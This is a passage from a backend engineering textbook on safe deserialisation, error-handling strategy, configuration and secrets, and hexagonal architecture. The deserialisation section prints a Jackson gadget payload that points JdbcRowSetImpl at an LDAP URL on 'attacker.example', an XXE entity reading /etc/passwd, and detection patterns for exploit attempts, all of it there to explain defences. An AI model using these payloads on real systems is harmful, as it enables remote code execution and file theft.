How formats evolve across versions without breaking clients (adding, renaming and removing fields, Protocol Buffers field numbers) is schema evolution, covered in Chapter 13.

> **Framework lens:** In Jackson, the JSON mapper used by Spring, unknown properties are controlled by `DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES`. A plain `ObjectMapper` fails on unknown properties by default; the `ObjectMapper` that Spring Boot configures **ignores** them. A typo in a request field therefore produces no error in a default Spring Boot application, just a missing value. Validation annotations (`@NotNull`, `@Min`, `@Size`, from Jakarta Validation) on the DTO, plus `@Valid` on the controller parameter, make the missing value fail with `400` instead of reaching the service.

### Mechanism 3: polymorphism, and how it becomes insecure

Suppose the API accepts different payment methods:

```json
{ "orderId": "9001", "payment": { "type": "card",          "token": "tok_8f2a" } }
{ "orderId": "9001", "payment": { "type": "bank_transfer", "iban": "DE89370400440532013000" } }
```

The mapper must decide which class to build for `payment`. There are two ways to tell it.

**Safe: a logical name mapped through a closed list.** The input carries a short name (`"card"`), and the code holds a fixed table from names to classes. Any other name is an error.

```pseudo
PAYMENT_TYPES = { "card": CardPayment, "bank_transfer": BankTransferPayment }   // closed allowlist

function bindPayment(jsonObject):
    cls = PAYMENT_TYPES.get(jsonObject["type"])
    if cls is null: throw UnknownPaymentType(jsonObject["type"])        // 400
    return deserialise(jsonObject, cls)
```

**Dangerous: a class name taken from the input.** Some mappers can be configured to write the full class name into the JSON and to instantiate whatever class the input names when reading it back:

```json
{ "orderId": "9001", "payment": { "@class": "com.shop.payments.CardPayment", "token": "tok_8f2a" } }
```

This is convenient for storing arbitrary object graphs, and it hands the choice of class to whoever writes the JSON. An attacker can name **any class on the server's classpath**, including thousands of classes from libraries the application merely includes. The mapper will construct it and call its setters with attacker-chosen values. The attacker looks for a **gadget**: a class whose constructor, setters or other methods called during deserialisation have a useful side effect, such as opening a network connection, loading a class, reading a file or running a command. Several gadgets linked so that each one's side effect calls the next form a **gadget chain**.

A real example from the history of Jackson security advisories used a class from the Java runtime itself:

```json
{ "orderId": "9001",
  "payment": [ "com.sun.rowset.JdbcRowSetImpl",
               { "dataSourceName": "ldap://attacker.example:1389/Exploit",
                 "autoCommit": true } ] }
```

The mapper builds `JdbcRowSetImpl`, calls `setDataSourceName` with the attacker's URL, then `setAutoCommit(true)`. That setter makes the object connect to its data source, which performs a directory (JNDI) lookup of the URL. On older Java versions the lookup could download and execute a class from the attacker's server. Newer Java versions block remote class loading by default, but many other gadget chains exist, which is why Jackson accumulated a long blocklist of dangerous classes before moving to the allowlist approach.

```text
 attacker JSON ──► mapper reads class name from input ──► constructs gadget class
                                                            │ calls setters (attacker values)
                                                            ▼
                                        side effect: connect / lookup / load class / exec
                                                            ▼
                                        code runs inside the server process, with its
                                        permissions, credentials and network access
```

**Native serialisation formats** are dangerous by design, because they exist to rebuild arbitrary object graphs and record the class of every object in the bytes:

- Java's built-in serialisation (`ObjectInputStream.readObject`) calls `readObject` methods on classes the stream names. Public gadget chains through common libraries (Apache Commons Collections among the first, demonstrated in 2015) made this a widespread remote-code-execution vector.
- Python's `pickle` can instruct the loader to call any function with any arguments, by design. Python's documentation states that the module is not secure and that only trusted data should be unpickled.
- PHP's `unserialize`, and .NET's `BinaryFormatter` (which Microsoft has deprecated and recommends against using) have the same property.
- Some YAML loaders construct arbitrary types from tags in the document (PyYAML's unsafe loader, older defaults of the Java library SnakeYAML).

### Mechanism 4: mitigation

1. **Never deserialise untrusted input with a native object format.** Use a data-only format (JSON, Protocol Buffers) mapped onto specific DTO types. This is the main defence; everything else is a fallback.
2. **Choose the target type in code, not from the input.** Bind request bodies to concrete DTO classes declared by the handler. For polymorphism, use logical names and a closed allowlist (Mechanism 3). Disable any "default typing" or "class name in the payload" feature.
3. **If a native format cannot be avoided** (a legacy protocol), apply a strict **allowlist filter** of permitted classes before any object is built. Java provides serialisation filters (`ObjectInputFilter`) for this purpose.
4. **Do not trust data you sent to the client earlier.** Data stored in a cookie, a hidden form field or a token and sent back is client input. If it must round-trip, sign it with an HMAC (Chapter 8, Section 8.5) and verify before parsing; better, keep it on the server and send only an identifier.
5. **Limit the parser.** Set maximum body size, nesting depth, string length and number length. A body with 100,000 nested arrays can overflow a recursive parser's stack (Chapter 2, Section 2.6); a number with a million digits can consume seconds of CPU. Recent versions of Jackson enforce such limits; check what yours does.
6. **Reduce the blast radius.** Keep libraries patched (most gadget chains are fixed by updates), remove unused libraries from the application (in Java, from the classpath, the set of locations the runtime loads classes from), run the process with least privilege, and restrict outbound network access, so that a gadget that connects out cannot reach the attacker.

The same family of problems appears in XML parsers. An **XML external entity (XXE)** attack declares an entity whose value is read from a file or URL (`<!ENTITY x SYSTEM "file:///etc/passwd">`), making the parser read local files or make requests on the attacker's behalf. **Entity expansion** ("billion laughs") defines entities that expand into each other until memory runs out. The fix for both is to disable document type definitions (DTDs) and external entities in the XML parser.

> **Framework lens:** In Jackson, the safe polymorphic form is `@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")` with the allowed subtypes listed in `@JsonSubTypes`. The dangerous forms are `JsonTypeInfo.Id.CLASS` (class names in the payload) on types that accept broad base classes such as `Object` or `Serializable`, and the old `enableDefaultTyping()` (deprecated since Jackson 2.10). Its replacement, `activateDefaultTyping`, requires a `PolymorphicTypeValidator`, which is where the allowlist goes.

### Guarantees and non-guarantees

Binding JSON onto concrete DTOs guarantees that only the classes you declared are constructed, with values converted to their declared types. It does not guarantee that the values are valid (validation, Section 12.6), that a dependency of yours does not deserialise something unsafely elsewhere (a cache client using native serialisation, a message consumer), or that the parser resists resource exhaustion without limits. Signing a payload guarantees it came from you unchanged; it does not make a native-format payload safe if the signing key leaks.

### Failure and diagnosis

- **Exploitation attempts.** Request bodies containing class names (`@class`, `com.sun.`, `java.lang.`), or binary bodies beginning with the Java serialisation header bytes `AC ED 00 05` (Base64 `rO0AB`). Evidence: WAF logs or request logs. Most are automated scans; any success shows up elsewhere.
- **Successful exploitation.** The application server makes outbound connections to unknown hosts, spawns shell processes, or writes unexpected files. Evidence: logs of the firewall that controls outbound (**egress**) traffic, process listings showing a shell as a child of the server process (Chapter 3, Section 3.5), file-integrity alerts.
- **Vulnerable configuration.** Found by searching the code: `ObjectInputStream`, `readObject`, `pickle.loads`, `yaml.load` without a safe loader, `enableDefaultTyping`, `Id.CLASS`; and by dependency scanners that report known vulnerabilities in mapper versions.
- **Parser resource exhaustion.** CPU spikes or stack overflows from single requests with deeply nested or huge bodies. Evidence: the failing request's size and structure in logs; thread dumps showing parser frames.

### Backend connection

Treat deserialisation as code execution controlled by the input, because with the wrong configuration that is what it is. Bind requests onto concrete DTOs, choose polymorphic types from a closed list, keep native serialisation away from anything an outsider can write, and put limits on every parser. The same rules apply to data from caches, queues and files: "internal" is not the same as "trusted" once an attacker can write to any of them.

---

## 12.8 Error Handling Strategy

### Definitions

An **error** is any outcome other than the requested operation completing normally. Errors fall into three families that need different treatment:

- **Expected domain outcomes**: the business says no. The product is out of stock, the coupon has expired, the order has already shipped.
- **Infrastructure failures**: something outside the code failed. The database is unreachable, a downstream call timed out, a disk is full.
- **Bugs**: the code is wrong. A null dereference, an index out of range, a broken invariant.

An **exception** is a language mechanism that interrupts normal execution and transfers control up the call stack to the nearest matching handler, **unwinding** (abandoning) every stack frame in between. A **checked exception** (in Java) must be declared in the method's signature and handled or re-declared by every caller; an **unchecked exception** need not be.

A **result type** represents failure as an ordinary return value: a function returns either a success holding a value or a failure holding an error, and the caller must inspect which one it got before using the value.

### Why it exists

Without a deliberate strategy, every developer handles errors their own way, and the system shows the full catalogue of failures: stack traces with SQL in response bodies, `500` for a user's typo, `200 OK` with `{"error": "..."}`, exceptions caught and ignored so that a half-finished operation commits, and the same stack trace logged five times by five layers. Clients cannot react correctly, monitoring cannot tell user mistakes from outages, and debugging becomes guesswork.

### Mechanism 1: exceptions and result types compared

```pseudo
// Exceptions: failure is invisible in the normal path
function placeOrder(customerId, command):
    product = products.findById(id)            // may throw NotFound or DatabaseUnavailable
    product.reserve(qty)                       // may throw OutOfStock
    return orders.save(order)                  // may throw DuplicateOrder

// Result types: failure is part of the return value
function placeOrder(customerId, command) -> Result<Order, OrderError>:
    product = products.findById(id)
    if product is Failure: return product.error            // NotFound
    reservation = product.value.reserve(qty)
    if reservation is Failure: return Failure(OutOfStock(id))
    return Success(orders.save(order))
```

| | Exceptions | Result types |
|---|---|---|
| How failure travels | automatically up the stack to the nearest handler | explicitly, returned by each function |
| Visible in the signature | no (except Java checked exceptions) | yes: the caller sees every failure it must handle |
| Forgetting to handle | the error propagates (often to a `500`) | the compiler or linter usually complains |
| Code noise | low in the happy path | higher, reduced by syntax (Rust's `?`, `match`) |
| Cost | creating an exception typically captures a stack trace, which is relatively expensive; unwinding is cheap | an ordinary return |
| Natural fit | bugs and infrastructure failures, which most code cannot handle and should let pass | expected domain outcomes, which callers should decide about |

Languages lean one way: Go returns `(value, err)` pairs, Rust uses `Result<T, E>`, and Java, Python and C# use exceptions. Within one codebase, a practical rule works in any language: **expected domain outcomes are explicit** (a result type, or a small set of named domain exceptions documented as part of the method's contract), and **bugs and infrastructure failures propagate** to one central boundary that turns them into responses. What must never happen is catching an exception you cannot actually handle and continuing as if the operation succeeded.

### Mechanism 2: the error taxonomy and its HTTP mapping

Every error that can reach a client should fall into a category with a fixed response, log level and retry advice. Chapter 7 (Section 7.5) explained the status codes; this table assigns them to application errors:

| Category | Example | Detected by | Status | Log | Client may retry? |
|---|---|---|---|---|---|
| Malformed request | invalid JSON, wrong type | framework, steps 1–3 | `400` | info | no, fix the request |
| Invalid input | quantity 0, email format | shape validation, step 4 | `400` or `422` | info | no |
| Not authenticated | missing or bad token | authentication middleware (Chapter 20) | `401` | info | after re-authenticating |
| Not allowed | another customer's order | service or policy | `403`, or `404` to hide existence | warn if suspicious | no |
| Not found | order 404040 | service | `404` | info | no |
| State conflict | cancel a shipped order; duplicate email | domain rule, unique constraint | `409` | info | after re-reading state |
| Precondition failed | stale `If-Match` version (Chapter 7, Section 7.13) | service | `412` | info | after re-reading |
| Business rule violated | coupon expired | domain | `422` | info | no |
| Too many requests | rate limit (Chapter 24) | middleware | `429` with `Retry-After` | info | yes, later |
| Dependency unavailable | payment provider down, circuit open | client adapter | `503` (or `502`) | warn or error | yes, with backoff |
| Dependency timed out | no answer within the deadline | client adapter | `504` or `503` | warn | **only if the operation is idempotent**: the outcome is unknown (Chapter 7, Section 7.15) |
| Bug | null dereference, broken invariant | anything | `500`, generic message | error, with stack trace | possibly, but it will usually fail again |

The 4xx rows are the client's responsibility and should not page anyone; the 5xx rows are yours. Mixing them (returning `500` for invalid input) makes error-rate alerts fire on user typos, which trains people to ignore them.

### Mechanism 3: translate errors at each boundary

Each layer should speak its own language. A raw database exception should never reach the controller, and an HTTP status should never appear in the domain. Errors are **translated** where they cross a boundary:

```text
 database        ERROR: duplicate key value violates unique constraint "users_email_key"
                 DETAIL: Key (email)=(ana@example.com) already exists.   (PostgreSQL, SQLSTATE 23505)
    │ repository (adapter) translates: SQLSTATE 23505 on users_email_key → EmailAlreadyRegistered
    ▼
 domain          EmailAlreadyRegistered(email)
    │ central error handler translates: EmailAlreadyRegistered → 409
    ▼
 HTTP            409 Conflict, problem details body
```

The repository is the only code that knows SQLSTATE `23505` means "unique violation" in PostgreSQL (MySQL reports the same situation as error `1062`). The handler is the only code that knows the domain error means `409`. Neither the service nor the controller deals with either detail.

The central error handler is the error middleware of Chapter 10 (Section 10.6), with a mapping table:

```pseudo
ERROR_MAP = {
    ValidationFailed:        (400, "validation-failed"),
    NotAuthenticated:        (401, "not-authenticated"),
    AccessDenied:            (403, "forbidden"),
    NotFound:                (404, "not-found"),
    EmailAlreadyRegistered:  (409, "email-taken"),
    InvalidStateTransition:  (409, "invalid-state"),
    OutOfStock:              (409, "out-of-stock"),
    BusinessRuleViolated:    (422, "rule-violated"),
    DependencyUnavailable:   (503, "dependency-unavailable"),
}

function errorMiddleware(req, next):
    try:
        return next(req)
    catch any as e:
        (status, code) = ERROR_MAP.lookupByTypeOrParent(e) or (500, "internal-error")
        if status >= 500: log.error("request failed", e, requestId = req.id)     // full stack trace, once
        else:             log.info("request rejected", code, requestId = req.id)  // no stack trace
        body = { "type": "https://errors.shop.example/" + code,                   // RFC 9457 fields
                 "title": titleFor(code), "status": status,
                 "detail": status < 500 ? e.publicMessage : "An internal error occurred.",
                 "instance": req.path, "requestId": req.id }
        return response(status, body, contentType = "application/problem+json")
```

The problem-details format (RFC 9457) was introduced in Chapter 7 (Section 7.5); its design for an API, with error codes and field-level validation errors, is Chapter 13. Two rules matter here:

- **Never put internal detail in a response.** Stack traces, SQL, class names, file paths and library versions help attackers map the system. For `5xx`, the body says only that an error occurred, plus the request ID; the detail goes to the log under the same ID (Chapter 10, Section 10.11).
- **Log once, at the boundary.** Code that catches an exception, logs it and rethrows it produces the same stack trace at every layer. Lower layers either handle an error completely or let it pass (adding context by wrapping it, not by logging it).

### Mechanism 4: errors and transactions

Errors and transactions interact in ways that decide whether data is correct:

```text
 service method (transactional through a proxy, Section 12.5)
   BEGIN
   save order                      ✔
   reserve stock                   ✘ throws OutOfStock
   ── exception propagates out of the method
 proxy sees the exception → ROLLBACK      order row discarded: correct

 the same method with a swallowed exception:
   BEGIN
   save order                      ✔
   try: reserve stock              ✘ throws
   catch: log.warn("reserve failed")        ← handled? no: ignored
   ── method returns normally
 proxy sees success → COMMIT             order exists, stock never reserved: corrupt
```

The transaction boundary reacts to **how the method ends**: normally (commit) or with an exception (rollback, subject to the framework's rules, such as Spring's default of committing on checked exceptions, Section 12.5). A swallowed exception is therefore not "defensive"; it converts a failure into a partial success. If a step is truly optional (sending a confirmation email), do it **outside** the transaction, after commit, and handle its failure separately (reliable follow-up actions use the outbox pattern, Chapter 25).

There is a second interaction: an error **after** the commit, or a timeout while waiting for the commit's acknowledgement, leaves the outcome unknown to the caller. The order may exist. Responding `500` tells the client "something failed", and a client that retries may create a second order. Idempotency keys (Chapter 13) make such retries safe.

### Concrete: one exception, end to end

```text
 1. client     POST /api/orders  {"items":[{"productId":"p-17","qty":50}]}
 2. controller binds and validates: OK; calls orderService.placeOrder (through the proxy)
 3. proxy      BEGIN
 4. service    product p-17 has stock 12 → product.reserve(50) throws OutOfStock(p-17, requested 50, available 12)
 5. proxy      exception passes through → ROLLBACK → rethrows
 6. controller does not catch it (it cannot do anything useful with it)
 7. middleware ERROR_MAP lookup: OutOfStock → (409, "out-of-stock")
               log.info("request rejected", "out-of-stock", requestId=7f3a)    no stack trace: not a bug
 8. response
      HTTP/1.1 409 Conflict
      Content-Type: application/problem+json

      {"type":"https://errors.shop.example/out-of-stock","title":"Not enough stock",
       "status":409,"detail":"Only 12 units of p-17 are available.",
       "instance":"/api/orders","requestId":"7f3a"}
```

Step 7 shows a real design choice: every domain error needs an explicit place in the map. An unmapped domain error falls through to `500`, which is wrong (the server did nothing wrong) and pages someone for a customer ordering too much.

> **Framework lens:** Spring MVC's central handler is a class annotated `@RestControllerAdvice` with `@ExceptionHandler` methods, one per exception type, each returning a response. Since Spring Framework 6, the `ProblemDetail` class produces RFC 9457 bodies, and Spring's own exceptions (for example `MethodArgumentNotValidException`, raised when `@Valid` fails, which Spring maps to `400`) can be rendered in that format. `ResponseStatusException` attaches a status to an exception directly, which is convenient but puts HTTP knowledge into whichever layer throws it; keep it in controllers.

### Guarantees and non-guarantees

A central error mapping guarantees a consistent status, body format and log level for every error type it knows, and that internal details do not leak. It does not guarantee correct classification of errors it has never seen (they become `500`), that the client knows whether a failed request had an effect (timeouts and post-commit failures leave the outcome unknown), or that partial work was undone (that depends on transaction boundaries and on not swallowing exceptions).

### Failure and diagnosis

- **Swallowed exceptions.** Partial data, missing side effects, no error anywhere. Evidence: empty or log-only `catch` blocks in code review; data inconsistencies with no matching error logs.
- **Wrong status classes.** A `5xx` error rate that rises with user mistakes, or `4xx` responses for real outages (clients then never retry). Evidence: group errors by type and status in logs; any domain error type appearing with `500` is unmapped.
- **`200` with an error body.** Monitoring, caches (Chapter 7, Section 7.12) and clients all treat the response as success. Evidence: response bodies with `"error"` fields and status `200`.
- **Information leakage.** Responses containing `at com.shop...`, `SQLSTATE`, `ORA-` or file paths. Evidence: search response samples or security scan reports. Fix: the generic `5xx` body.
- **Duplicate stack traces.** One failure produces five identical stack traces in logs. Evidence: the same request ID on several error lines. Fix: log only at the boundary.

### Backend connection

Decide the strategy once for the whole application: which errors are domain outcomes, how they are expressed, how each maps to HTTP, and where logging happens. Translate infrastructure errors in adapters, map everything in one place, never return internals, never swallow an exception inside a transaction, and remember that "failed" and "unknown" are different answers.

---

## 12.9 Configuration, Profiles, and Secrets

### Definitions

**Configuration** is every value that may differ between deployments of the same code, or change over time without a code change: database addresses, credentials, pool sizes, timeouts, the URLs of other services, feature switches. Code is the same in development, testing and production; configuration is what makes each deployment different.

A **secret** is a configuration value whose disclosure would grant access to something: a database password, an API key, a private key, a token-signing key.

A **profile** is a named set of configuration values for one kind of environment, such as `dev`, `test` or `prod`, activated when the application starts.

The **twelve-factor app** is a widely cited set of twelve practices for building services that run well on cloud platforms. Its third factor, **config**, requires strict separation of configuration from code, and recommends supplying configuration through **environment variables**: named string values that the operating system passes to a process when it starts, and that the process can read (and its children inherit).

### Why it exists

Two practices force configuration out of the code.

The first is **build once, deploy many**. The artifact that passed testing (a container image, a JAR file) should be exactly the artifact that runs in production. If the production database address is compiled in, every environment needs its own build, and the thing you tested is not the thing you ship.

The second is **secrets**. A password written in source code is copied to every developer's machine, every CI runner and every backup, and it stays in version control history forever, even after the line is deleted. Anyone with read access to the repository has production access.

The test the twelve-factor guidance suggests is simple: could the codebase be made public right now without compromising any credentials? If not, configuration is mixed with code.

### Mechanism 1: layered sources and precedence

Applications read configuration from several **sources** and merge them. When a key appears in more than one, the source with higher **precedence** wins. A typical ladder, from lowest to highest:

```text
   lowest  ┌──────────────────────────────────────────────┐
           │ 1. defaults in code                           │  db.poolSize = 10
           │ 2. packaged config file (inside the artifact) │  db.poolSize = 10, http.port = 8080
           │ 3. profile file for the active profile        │  (prod) db.url = jdbc:…prod-db…
           │ 4. external config file (mounted at runtime)  │  db.poolSize = 15
           │ 5. environment variables                      │  DB_POOLSIZE = 20
           │ 6. command-line arguments                     │  --db.poolSize=25
   highest └──────────────────────────────────────────────┘

 resolve("db.poolSize") with sources 1–5 present  →  20   (from the environment)
 resolve("http.port")                             →  8080 (only the packaged file sets it)
```

The arrangement lets sensible defaults live with the code, while each deployment overrides only what differs. It also explains a common surprise: a value edited in a file "has no effect" because a higher source, often an environment variable set long ago in a deployment manifest, overrides it.

### Mechanism 2: typed configuration, validated at startup

Configuration arrives as strings. Reading it with string lookups scattered through the code (`getProperty("db.poolSize")` in ten places) repeats parsing and defaults, and a typo in a key name silently returns null. The better pattern binds configuration once, at startup, into typed objects, validates them, and injects them like any other dependency (Section 12.4):

```pseudo
class DatabaseConfig:
    url: Url                         required
    username: string                 required
    password: Secret                 required; toString() returns "****"
    poolSize: integer                1 ≤ poolSize ≤ 50
    acquireTimeout: Duration         100ms ≤ acquireTimeout ≤ 10s

function loadConfig():
    raw = mergeSources([defaults, packagedFile, profileFile, externalFile, env, args])
    db  = bind(raw, "db", DatabaseConfig)
    errors = validate(db)
    if errors not empty:
        log.error("invalid configuration", errors)   // names keys, never secret values
        exit(1)                                        // refuse to start
    return AppConfig(db, ...)
```

```text
 $ DB_POOLSIZE=500 ./orders-service
 ERROR invalid configuration:
   db.poolSize = 500: must be between 1 and 50 (source: environment variable DB_POOLSIZE)
   db.password: required but not set
 process exits with status 1
```

Failing at startup is far better than starting with a bad value. A process that refuses to start is caught by the deployment's readiness checks (Chapter 10, Section 10.3) and the old version keeps serving. A process that starts with a pool of 500, or a missing timeout, fails later, under load, in a way that looks unrelated to configuration.

### Mechanism 3: profiles, and keeping them thin

Profiles group values per environment: the `dev` profile points at a local database and enables verbose logging; `prod` points at the production cluster. Their danger is profile-specific **behaviour**: code paths that run only when a certain profile is active (`if profile == "dev": skipAuth()`). Such code is never tested in the form that runs in production, and an accidentally active `dev` profile in production turns it on. Keep profiles to **values**, keep the differences between environments small (the twelve-factor "dev/prod parity" factor), and make the production profile the safe one: a forgotten setting should fail startup, not fall back to a development default such as `localhost` or an in-memory database.

### Mechanism 4: how secrets reach the process

| Method | How it works | Strengths | Risks |
|---|---|---|---|
| Environment variables | the platform sets them when starting the process | simple; supported everywhere; twelve-factor default | inherited by every child process; visible in `/proc/<pid>/environ` to the same user and root (Chapter 3, Section 3.19); often dumped by debug pages, crash reports and "print environment" log lines; changing them needs a restart |
| Files mounted at runtime | the platform writes each secret to a file (often in memory-backed storage) with restrictive permissions | not inherited; file permissions control access; some platforms update the file when the secret rotates | the application must re-read the file to pick up rotation |
| Secret manager, fetched at startup | the application authenticates to a secret store and fetches secrets over TLS | central audit log, access policies, rotation, short-lived generated credentials | the store becomes a startup dependency; the application needs an identity to authenticate with (Chapter 20) |
| Platform secret objects | the orchestrator stores secrets and injects them as variables or files | integrated with deployment | in Kubernetes, Secret values are only Base64-encoded, not encrypted, unless encryption at rest is configured for the cluster's store (Chapter 8, Section 8.2: Base64 is an encoding) |

Whatever the method, three rules hold. **Never log a secret**: give secret values a type whose text form is masked (the `Secret` type above), and never print the whole configuration or environment. **Plan for rotation**: a credential that cannot be changed without an outage will not be changed after a leak; support two valid credentials during a changeover. **A leaked secret is rotated, not deleted**: removing it from the repository does not remove it from history, clones or caches. Chapter 20 covers secret management and service identities in depth.

### Mechanism 5: changing configuration at run time

Some values benefit from changing without a restart: log levels during an incident, a **feature flag** (a configuration switch that turns a code path on or off for some or all users, so features can be released separately from deployments). Run-time reload must be designed: components must re-read the value (a pool cannot simply resize itself if it read its size once at startup), and readers on many threads must see a consistent set of values (swap one immutable configuration object atomically, Chapter 5, Section 5.10). Treat a configuration change as a deployment. A bad value pushed to every instance at once causes an outage as surely as a bad release, so stage configuration rollouts the way you stage code rollouts (Chapter 26).

> **Framework lens:** Spring Boot reads `application.properties` or `application.yml`, then `application-{profile}.yml` for each active profile (`spring.profiles.active=prod`). Command-line arguments override Java system properties, which override operating-system environment variables, which override profile-specific files, which override the default file. **Relaxed binding** maps the environment variable `SPRING_DATASOURCE_URL` to the property `spring.datasource.url`. `@ConfigurationProperties` classes bind a prefix into a typed object, and adding `@Validated` with validation annotations makes invalid values fail startup. The Actuator `env` endpoint lists each property and the source that supplied it; in recent versions it masks values by default, and it should never be exposed publicly.

### Guarantees and non-guarantees

Externalised, validated configuration guarantees that one artifact runs in every environment, and that invalid or missing values stop the process at startup rather than in the middle of the night. It does not guarantee that all instances have the same values (configuration can drift between hosts or deployments), that secrets stay secret once loaded (the process can still log them or expose them through a debug endpoint), or that a valid value is a good one (a pool of 50 passes validation and can still overwhelm the database, Chapter 11, Section 11.5).

### Failure and diagnosis

- **The wrong profile in production.** Symptom: production writes to a development database, or uses an in-memory database and loses data on restart. Evidence: the startup log line listing active profiles (log it explicitly), and the configured database host. Prevention: make the production profile the default-safe one; fail startup if no profile is set.
- **A missing variable falls back to a default.** Symptom: a service calls `localhost` for a dependency and gets `ECONNREFUSED` (Chapter 6, Section 6.14). Evidence: the effective configuration printed at startup with secrets masked. Fix: no defaults for environment-specific values.
- **A setting "has no effect".** A higher-precedence source overrides it, or the key is misspelt and ignored. Evidence: an endpoint or log that shows each property's source.
- **A secret in version control or logs.** Evidence: secret-scanning tools in CI or the hosting platform; searches for key patterns in logs. Fix: rotate first, then remove.
- **Configuration drift.** Some instances behave differently. Evidence: compare effective configuration across instances; check whether some were started before a change.

### Backend connection

Build one artifact; supply everything environment-specific from outside; bind configuration into typed, validated objects at startup and inject them; keep profiles to values; and treat secrets as values that must never be printed, must be rotatable, and must be revoked when they leak.

---

## 12.10 Hexagonal Architecture and Clean Architecture

### Definitions

**Hexagonal architecture**, also called **ports and adapters**, was described by Alistair Cockburn. It places the application's business logic in a **core** (the domain model plus the use cases), and lets the core talk to the outside world only through **ports**: interfaces that the core itself defines, in its own terms.

An **adapter** connects a port to a specific technology. Adapters come in two kinds:

- **Driving adapters** (also called **primary** or inbound) call **into** the core: an HTTP controller, a message consumer, a command-line tool, a test.
- **Driven adapters** (also called **secondary** or outbound) are called **by** the core, through ports it defines: a SQL repository, an email client, a payment-provider client.

**Clean architecture**, described by Robert C. Martin, draws the same idea as concentric rings: entities at the centre, then use cases, then interface adapters, then frameworks and drivers on the outside. Its central rule is the **dependency rule**: source-code dependencies point only inward. Inner rings know nothing about outer ones. **Onion architecture** (Jeffrey Palermo) is a close relative. All three apply the Dependency Inversion Principle of Section 12.4 to the whole application.

### Why it exists

In the layered architecture of Section 12.2, the arrows point downward: controller to service to repository to database driver. That means the business logic in the service **depends on** the data-access layer, and through it on the database technology:

```text
 Layered:     Controller ──► Service ──► Repository (SQL) ──► driver
                               │
                               └── the service's source code names SqlOrderRepository,
                                   handles SQLException, maybe uses ORM-annotated classes
```

Several things follow. To test a business rule you need a database, or a mock of a concrete SQL class. Infrastructure types leak upward: the service catches driver exceptions, and domain classes carry ORM annotations that describe table mappings. Each new entry point (a queue consumer next to the HTTP controller) tends to copy logic from the controller. And replacing an integration (a new payment provider) touches business code.

Hexagonal architecture inverts the one dependency that causes most of this. The core declares what it needs as interfaces; infrastructure implements them.

### Mechanism: the shape and the dependency direction

```text
                           DRIVING SIDE                                DRIVEN SIDE
                        (calls the core)                          (called by the core)

    HTTP controller ─────┐                                     ┌───── SqlOrderRepository
                         │   ┌──────────────────────────────┐  │        implements OrderRepository
    Queue consumer ──────┼──►│ inbound port: PlaceOrder     │  │
                         │   │                              │  ├───── HttpPaymentGateway
    CLI / batch job ─────┤   │   CORE                       │  │        implements PaymentGateway
                         │   │   use cases + domain model   │  │
    Test ────────────────┘   │                              │  └───── EmailNotifier
                             │ outbound ports (interfaces): │           implements Notifier
                             │   OrderRepository            │◄─────── (arrows from adapters point
                             │   PaymentGateway, Notifier   │          INTO the core: they depend
                             └──────────────────────────────┘          on the interfaces it owns)

 Source dependencies:   adapters ──► core        never   core ──► adapters
 Runtime calls:         driving adapter → core → driven adapter (through the port)
```

The key distinction is between **who calls whom at run time** and **whose source code names whom**. At run time the core still calls the SQL repository. But the core's code names only `OrderRepository`, an interface it defines; the SQL class names the interface to implement it. The composition root (Section 12.4) connects them.

### Concrete: one use case, three adapters, one test

```pseudo
// ── core: knows nothing about HTTP, SQL, queues or any framework ──────────
interface OrderRepository:                    // outbound port, defined by the core
    function findById(id) -> Order or null
    function save(order)

interface PaymentGateway:                     // outbound port
    function charge(orderId, amount, paymentToken) -> PaymentResult   // Approved | Declined | Unknown

interface UnitOfWork:                         // outbound port: "run this as one transaction"
    function run(work)

class PlaceOrderUseCase:                      // inbound port's implementation
    orders, products, payments, unitOfWork, clock
    function execute(command) -> PlaceOrderResult:
        order = unitOfWork.run(() ->                                  // transaction 1: short
            o = Order.place(command.customerId, linesFor(command), discountAt(clock.now()))
            orders.save(o)
            return o)
        result = payments.charge(order.id, order.total, command.paymentToken)   // no transaction open,
                                                                                 // no connection held
        unitOfWork.run(() ->                                          // transaction 2: short
            if result is Approved: order.markPaid(result.payment)
            orders.save(order))
        return PlaceOrderResult(order.id, order.status)

// ── driven adapters: one technology each ─────────────────────────────────
class SqlOrderRepository implements OrderRepository:   // knows SQL; maps rows ↔ Order
class HttpPaymentGateway implements PaymentGateway:    // knows the provider's HTTP API, timeouts,
                                                        // and translates its errors (Section 12.8)
// ── driving adapters ──────────────────────────────────────────────────────
class OrderHttpController:                     // JSON ↔ command; command → useCase.execute
class OrderQueueConsumer:                      // message ↔ command; the SAME use case

// ── a test: in-memory adapters, no infrastructure ────────────────────────
test "a declined payment leaves the order placed but unpaid":
    orders   = InMemoryOrderRepository()
    payments = FakePaymentGateway(always = Declined)
    useCase  = PlaceOrderUseCase(orders, InMemoryProducts(stock = {"p-17": 5}), payments,
                                 InMemoryUnitOfWork(), FixedClock(t0))
    result   = useCase.execute(PlaceOrder(customer = 81, items = [("p-17", 2)], token = "tok"))
    assert orders.findById(result.orderId).status == PLACED
```

A typical package arrangement makes the dependency rule visible, and tools can enforce it (no class in `core` may import from `adapters`):

```text
 orders/
 ├── core/
 │   ├── domain/        Order, OrderLine, Money, OrderStatus
 │   ├── ports/         OrderRepository, PaymentGateway, Notifier   (interfaces)
 │   └── usecases/      PlaceOrderUseCase, CancelOrderUseCase
 └── adapters/
     ├── in/http/       OrderHttpController, request/response DTOs
     ├── in/queue/      OrderQueueConsumer, message DTOs
     ├── out/sql/       SqlOrderRepository, row mapping
     └── out/payment/   HttpPaymentGateway, provider DTOs
```

Where does the **transaction** go? When a use case touches only the database, the transaction wraps the whole use case, as in Section 12.2. In a strict hexagonal design the core cannot name a framework's transaction API, so either the core defines a small port of its own (the `UnitOfWork` above) that an adapter implements, or the transaction is applied around the use case from outside by interception (Section 12.5) in the composition root.

`PlaceOrderUseCase` shows the exception. It calls an external payment provider, and wrapping that call in the transaction would hold a database connection for the provider's whole response time: the pool-starvation failure of Chapter 11 (Section 11.5 and Lab 1). So the use case runs two short transactions with the network call between them. The price is a window in which the order exists unpaid, and a charge whose outcome may be unknown if the call times out. Idempotency keys (Chapter 13) make the charge safe to retry, and Chapter 25 covers recovering such multi-step operations. The `UnitOfWork` port is what lets the core express "these two steps, each atomic" without naming any framework.

### What it costs

Hexagonal architecture is not free, and interviewers expect you to say so:

- **More types.** Each outbound dependency becomes an interface plus an implementation, and each adapter has its own DTOs.
- **More mapping.** If the domain model is kept free of persistence details, the SQL adapter maps between domain objects and rows or ORM entities. Two models of an order must be kept in step, and a field forgotten in the mapping is silently lost.
- **Indirection.** Following a request means jumping from controller to port to use case to port to adapter.
